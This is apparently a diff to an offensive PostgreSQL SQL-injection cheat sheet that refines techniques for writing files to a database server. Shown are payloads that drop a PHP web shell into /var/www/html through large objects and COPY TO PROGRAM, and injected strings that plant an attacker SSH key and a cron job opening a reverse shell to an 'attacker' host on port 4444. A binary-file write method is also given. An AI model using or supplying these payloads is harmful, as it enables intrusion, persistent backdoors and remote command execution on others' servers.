@@ -62,18 +62,21 @@ Large objects can be used for file operations.
 **Note:** Use `lo_create(0)` to auto-generate a unique OID instead of specifying a fixed value, which can conflict with existing objects. Always clean up with `lo_unlink(<oid>)` after use to avoid resource leakage.
 
 ```sql
--- Step 1: Create large object with auto-generated OID (returns OID, e.g., 16384)
+-- Step 1: Create large object with auto-generated OID
 SELECT lo_create(0);
+-- Returns OID (e.g., 16384) - note this value for subsequent steps
 
--- Step 2: Insert content using returned OID
-INSERT INTO pg_largeobject VALUES (16384, 0, decode('3c3f706870207379...', 'hex'));
+-- Step 2: Insert content using returned OID (substitute actual OID)
+INSERT INTO pg_largeobject VALUES (<oid>, 0, decode('3c3f706870207379...', 'hex'));
 
 -- Step 3: Export to file
-SELECT lo_export(16384, '/var/www/html/shell.php');
+SELECT lo_export(<oid>, '/var/www/html/shell.php');
 
 -- Step 4: Clean up to avoid resource leakage
-SELECT lo_unlink(16384);
+SELECT lo_unlink(<oid>);
 ```
+
+In interactive clients (psql, pgAdmin), copy the OID from step 1's output and substitute it into steps 2-4. For injection contexts, use the DO block below which handles OID capture automatically.
 
 **Alternative: Single-shot with DO block:**
 
@@ -104,8 +107,8 @@ SELECT lo_export(<oid>, '/var/www/html/shell.php');
 Execute commands with output (PostgreSQL 9.3+):
 
 ```sql
--- Write to file using shell commands
-COPY (SELECT '') TO PROGRAM 'echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php';
+-- Write to file using shell commands (use shell single quotes to prevent $var expansion)
+COPY (SELECT '') TO PROGRAM 'echo ''<?php system($_GET["cmd"]); ?>'' > /var/www/html/shell.php';
 
 -- Alternative using tee
 COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';
@@ -146,18 +149,33 @@ SELECT pg_ls_dir('/var/www/html');
 '; COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO '/var/lib/postgresql/.ssh/authorized_keys'--
 
 -- Write cron job
-'; COPY (SELECT '* * * * * postgres /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"') TO '/etc/cron.d/backdoor'--
+'; COPY (SELECT '* * * * * postgres /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"') TO '/var/spool/cron/postgres'--
 ```
 
 ### Writing Binary Files
 
+For binary data, `lo_from_bytea()` (PostgreSQL 9.4+) is the simplest approach:
+
 ```sql
--- Using large objects for binary data
-SELECT lo_create(0);  -- Create new large object
--- Get the returned OID, then:
-SELECT lowrite(lo_open(<oid>, 131072), decode('<hex_data>', 'hex'));
-SELECT lo_close(lo_open(<oid>, 131072));
-SELECT lo_export(<oid>, '/path/to/file');
+-- Preferred: single-call binary write
+SELECT lo_export(lo_from_bytea(0, decode('<hex_data>', 'hex')), '/path/to/file');
+```
+
+For older PostgreSQL versions or fine-grained control, use `lowrite()` with a DO block:
+
+```sql
+DO $$
+DECLARE
+  oid_var oid;
+  fd integer;
+BEGIN
+  oid_var := lo_create(0);
+  fd := lo_open(oid_var, 131072);  -- 131072 = INV_WRITE
+  PERFORM lowrite(fd, decode('<hex_data>', 'hex'));
+  PERFORM lo_close(fd);
+  PERFORM lo_export(oid_var, '/path/to/file');
+  PERFORM lo_unlink(oid_var);
+END $$;
 ```
 
 ### PostgreSQL 11+ Role-Based Access
